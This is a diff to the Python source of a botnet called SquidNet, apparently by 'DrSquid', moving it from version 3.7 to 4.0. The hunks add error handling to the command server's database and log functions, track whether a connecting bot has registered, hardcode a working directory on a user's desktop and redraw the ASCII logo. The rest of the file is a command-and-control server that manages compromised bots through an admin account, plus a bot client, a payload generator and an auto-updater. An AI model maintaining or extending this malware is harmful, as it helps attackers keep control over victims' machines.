@@ -1,5 +1,5 @@
 import socket, threading, hashlib, os, datetime, time, sqlite3, shutil, urllib.request, json, sys
-
+os.chdir("C:\\Users\\pfang\\Desktop\\SquidNet2\\SquidNetServer\\")
 class BotNet:
     """Main Class for the BotNet. Every single line of server code, payload code is inside of this class.
     There are many functions inside of the class, where they have many different uses. They vary in usefullness
@@ -34,12 +34,12 @@ class BotNet:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________         ________    _________ 
- /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \   \______  \\
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <       /    /
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \     /    / 
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ /____/  
-        \/    |__|             \/ || ||  \/     \/             \/              \/  \/         
+  _________            .__    .||_||_||__          __  ________           _____    _______   
+ /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  __/  |  |   \   _  \  
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ /   |  |_  /  /_\  \ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   /    ^   /  \  \_/   \\
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/\____   | /\ \_____  /
+        \/    |__|             \/ || ||  \/     \/             \/           |__| \/       \/ 
                                || || ||
                                || || ||
                                || || ||
@@ -124,13 +124,18 @@ Advanced Botnet By DrSquid
         """Optimization code made for executing commands on db files. The reason it was made was for optimization
         purposes. This excerpt of code would be pretty much all over the place in this script if it weren't a
         function, and it would make the script look less elegant and clean with all of the repitition."""
-        db = sqlite3.connect(file)
-        cursor = db.cursor()
-        cursor.execute(cmd)
-        output = cursor.fetchall()
-        db.commit()
-        cursor.close()
-        db.close()
+        output = ""
+        try:
+            db = sqlite3.connect(file)
+            cursor = db.cursor()
+            cursor.execute(cmd)
+            output = cursor.fetchall()
+            db.commit()
+            cursor.close()
+            db.close()
+        except Exception as e:
+            self.log(f"[({datetime.datetime.today()})][(RESETSQL)]: Error with SQL Database file '{self.sqlfilename}': {e}, reconfiguring as a precaution.")
+            self.conf_dbfile()
         return output
     def conf_dbfile(self):
         """This function helps configure the database file that contains the IP whitelists and banlists.
@@ -362,11 +367,16 @@ Advanced Botnet By DrSquid
         is the same as the output in the log file. The server owner would be able to see any bugs or issues, or 
         easily anything that happened in the server at all. However, the log file is wiped everytime the server
         restarts(I can easily change that, you can contact me if you want that to happen)."""
+        content = ""
         if display:
             print(logitem)
-        file = open(self.logfile, "r")
-        content = file.read()
-        file.close()
+        try:
+            file = open(self.logfile, "r")
+            content = file.read()
+            file.close()
+        except Exception as e:
+            print(f"[({datetime.datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution.")
+            content = f"""{self.logo()}\n[({datetime.datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution."""
         file = open(self.logfile,"w")
         file.write(content+"\n"+logitem)
         file.close()
@@ -414,6 +424,7 @@ Advanced Botnet By DrSquid
         bot = False
         name = ip
         admin = False
+        registered = False
         while True:
             try:
                 display_single_msg = True
@@ -435,11 +446,11 @@ Advanced Botnet By DrSquid
                             name = info[0]
                             ipaddr = info[2]
                             if ipaddr in self.return_iplist("ban"):
-                                self.log(f"[({datetime.datetime.today()})][(BANNED_IP)]: {ip[0]} attempted to join the server, however they were banned!")
                                 conn.close()
                                 break
+                            registered = True
                             original_name = name
-                            print(f"[({datetime.datetime.today()})][(BOTJOIN)]: Bot {name} has joined the botnet.")
+                            self.log(f"[({datetime.datetime.today()})][(BOTJOIN)]: Bot {name} has joined the botnet.")
                             try:
                                 self.adminconn.send(f"\n[(SERVER)]: Bot {name} has joined the botnet.".encode())
                             except:
@@ -743,14 +754,16 @@ Advanced Botnet By DrSquid
                             else:
                                 self.log(f"[({datetime.datetime.today()})][({name})]: Attempting to log into the Admin Account.")
             except Exception as e:
-                self.log(f"[({datetime.datetime.today()})][(ERROR)]: Closing connection with {name} due to error: {e}")
+                if registered:
+                    self.log(f"[({datetime.datetime.today()})][(ERROR)]: Closing connection with {name} due to error: {e}")
                 if conn == self.adminconn:
                     self.log(f"[({datetime.datetime.today()})][(INFO)]: The admin has left the Botnet.")
                     self.adminconn = None
                     self.admin_online = False
                 else:
                     try:
-                        self.adminconn.send(f"[(SERVER)]: {name} has disconnected from the Botnet.".encode())
+                        if registered:
+                            self.adminconn.send(f"[(SERVER)]: {name} has disconnected from the Botnet.".encode())
                     except:
                         pass
                 if conn == self.focus_conn:
@@ -4269,7 +4282,10 @@ class Bot:
                 break
             except:
                 self.client.close()
-        self.client.send(self.get_info())
+        try:
+            self.client.send(self.get_info())
+        except:
+            pass
         reciever = threading.Thread(target=self.recv).start()
         self.pkt_sender = threading.Thread(target=self.check_still_connected).start()
     def initiate_connection(self):
@@ -4550,7 +4566,7 @@ bot.initiate_connection()
         return payload
 class AutoUpdate:
     def __init__(self):
-        self.version = 3.7
+        self.version = 4.0
     def check_update(self):
         print(BotNet.logo(None))
         print("[+] Checking for updates.....")
